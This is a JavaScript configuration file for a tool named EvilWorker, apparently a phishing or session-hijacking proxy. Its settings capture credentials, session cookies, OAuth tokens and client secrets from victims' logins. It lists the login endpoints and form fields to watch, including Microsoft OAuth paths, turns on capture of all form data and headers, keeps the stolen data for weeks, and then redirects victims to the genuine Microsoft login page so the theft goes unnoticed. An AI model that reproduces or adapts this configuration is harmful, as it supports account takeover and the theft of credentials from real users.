// EvilWorker Configuration File
// This file contains settings for credential collection and redirect behavior

module.exports = {
    // Credential Collection Settings
    credentials: {
        // Enable/disable automatic redirect after credential collection
        enableRedirect: process.env.ENABLE_CREDENTIAL_REDIRECT !== "false",
        
        // URL to redirect to after collecting credentials
        redirectUrl: process.env.CREDENTIALS_REDIRECT_URL || "https://login.microsoftonline.com/",
        
        // Minimum data capture requirements before redirect
        minDataCapture: {
            cookies: 1,           // Minimum cookies to capture
            credentials: 1,       // Minimum credentials to capture
            requests: 1,          // Minimum requests to capture
            formSubmissions: 1    // Minimum form submissions to capture
        },
        
        // Delay before redirect (in milliseconds) to ensure data capture
        redirectDelay: process.env.REDIRECT_DELAY || 1000,
        
        // Keywords to detect credential-related cookies
        credentialKeywords: [
            'password', 'credential', 'auth', 'token', 
            'session', 'login', 'username', 'user', 'pass',
            'secret', 'key', 'hash', 'salt', 'nonce',
            'jwt', 'bearer', 'access', 'refresh', 'id_token'
        ],
        
        // Login endpoints to monitor for credential submission
        loginEndpoints: [
            '/login', '/signin', '/auth', '/authenticate', '/signon',
            '/common/login', '/common/signin', '/oauth2/authorize',
            '/oauth2/v2.0/authorize', '/common/oauth2/authorize',
            '/signin/oauth', '/oauth/signin', '/account/login',
            '/user/login', '/admin/login', '/portal/login'
        ],
        
        // Form field names that indicate credential submission
        credentialFields: [
            'password', 'username', 'user', 'pass', 'pwd',
            'login', 'signin', 'auth', 'credential', 'email',
            'mail', 'account', 'accountname', 'userid', 'user_id',
            'secret', 'key', 'hash', 'salt', 'nonce', 'jwt',
            'bearer', 'access', 'refresh', 'id_token', 'code',
            'state', 'redirect_uri', 'client_id', 'client_secret'
        ]
    },
    
    // Logging Settings
    logging: {
        // Enable detailed credential collection logging
        enableCredentialLogging: true,
        
        // Log format for credential events
        credentialLogFormat: {
            timestamp: true,
            session: true,
            event: true,
            redirectUrl: true,
            cookies: true,
            requestBody: true
        },
        
        // Enable comprehensive session logging
        enableSessionLogging: true,
        
        // Enable data capture logging
        enableDataCaptureLogging: true
    },
    
    // Security Settings
    security: {
        // Minimum number of credential indicators before redirect
        minCredentialIndicators: 1,
        
        // Enable session cleanup after redirect
        cleanupSessionAfterRedirect: false,
        
        // Additional security headers for redirect
        redirectHeaders: {
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        },
        
        // Data capture security
        dataCapture: {
            // Ensure all data is encrypted before storage
            encryptAllData: true,
            
            // Validate data integrity before redirect
            validateDataIntegrity: true,
            
            // Backup data before redirect
            createBackup: true
        }
    },
    
    // Data Capture Settings
    dataCapture: {
        // Enable comprehensive data capture
        enableComprehensiveCapture: true,
        
        // Capture all form data (not just credentials)
        captureAllFormData: true,
        
        // Capture all cookies (not just credential-related)
        captureAllCookies: true,
        
        // Capture request headers
        captureRequestHeaders: true,
        
        // Capture response headers
        captureResponseHeaders: true,
        
        // Create session summary files
        createSessionSummaries: true,
        
        // Data retention settings
        retention: {
            // Keep session data for X days
            sessionDataDays: 30,
            
            // Keep encrypted logs for X days
            encryptedLogsDays: 90,
            
            // Auto-cleanup old data
            autoCleanup: true
        }
    }
};
